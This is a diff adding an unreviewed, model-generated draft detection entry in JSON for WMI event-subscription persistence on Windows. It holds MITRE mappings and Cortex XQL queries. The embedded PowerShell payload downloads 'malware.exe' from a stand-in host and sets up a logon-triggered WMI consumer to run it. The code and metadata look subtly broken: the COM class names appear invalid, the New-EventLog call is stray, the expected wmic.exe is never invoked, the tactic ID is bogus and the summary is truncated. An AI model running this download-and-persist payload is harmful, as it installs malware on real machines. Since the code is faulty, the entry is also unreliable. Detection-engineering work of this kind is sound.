@@ -1,0 +1,151 @@
+{
+  "id": "TTP-0000-0014",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "source-not-recorded"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "WMI Event Subscription Persistence via PowerShell",
+    "summary": "An attacker uses PowerShell to create WMI event filters, command line consumers, and bindings to execute a payload on system events and ensure persistence across reboots. Cortex should detect the crea",
+    "description": "An attacker uses PowerShell to create WMI event filters, command line consumers, and bindings to execute a payload on system events and ensure persistence across reboots. Cortex should detect the creation of WMI subscription objects using wmic.exe and powershell.exe."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1546",
+        "subtechnique_id": "T1546.003",
+        "name": "T1546.003",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      },
+      {
+        "technique_id": "T1047",
+        "name": "Windows Management Instrumentation",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "mkdir C:\\temp\nwget http://192.0.2.1/malware.exe -OutFile C:\\temp\\malware.exe\npowershell.exe -Command \"New-EventLog -LogName Application -Source 'Microsoft-Windows-GroupPolicy'\n$Filter = New-Object -ComObject 'WbemScripting.SWbemFilter'\n$Filter.Query = 'SELECT * FROM Win32_LogonSession'\n$Filter.Name = 'LogonFilter'\n$Filter.Put_()\n$Consumer = New-Object -ComObject 'WbemScripting.SWbemConsumer'\n$Consumer.Name = 'LogonConsumer'\n$Consumer.CommandLineTemplate = 'C:\\\\temp\\\\malware.exe'\n$Consumer.Put_()\n$Binding = New-Object -ComObject 'WbemScripting.SWbemBinding'\n$Binding.Filter = $Filter\n$Binding.Consumer = $Consumer\n$Binding.Put_()\"\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "PowerShell process creating WMI subscription objects",
+        "expected_value": "actor_process_image_name = 'powershell.exe'"
+      },
+      {
+        "artifact_type": "process",
+        "description": "WMIC process creating WMI subscription objects",
+        "expected_value": "action_process_image_name = 'wmic.exe'"
+      },
+      {
+        "artifact_type": "file",
+        "description": "Malware payload file created in temp directory",
+        "expected_value": "action_file_path = 'C:\\\\temp\\\\malware.exe'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "WMI Event Filter Creation",
+        "description": "Detection of WMI event filter creation via PowerShell or WMIC",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'powershell.exe' or action_process_image_name = 'wmic.exe'\n| filter action_process_command_line contains 'New-EventLog' or action_process_command_line contains 'SWbemFilter'\n| filter causality_actor_process_image_name = 'powershell.exe' or causality_actor_process_image_name = 'wmic.exe'",
+        "mitre_technique_ids": [
+          "T1546.003"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "WMI Subscription Creation Hunt",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'powershell.exe' or action_process_image_name = 'wmic.exe'\n| filter action_process_command_line contains 'SWbemFilter' or action_process_command_line contains 'SWbemConsumer'\n| filter causality_actor_process_image_name = 'powershell.exe' or causality_actor_process_image_name = 'wmic.exe'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": []
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "MITRE ATT&CK T1546.003",
+      "url": "https://attack.mitre.org/techniques/T1546/003/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1047",
+      "url": "https://attack.mitre.org/techniques/T1047/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
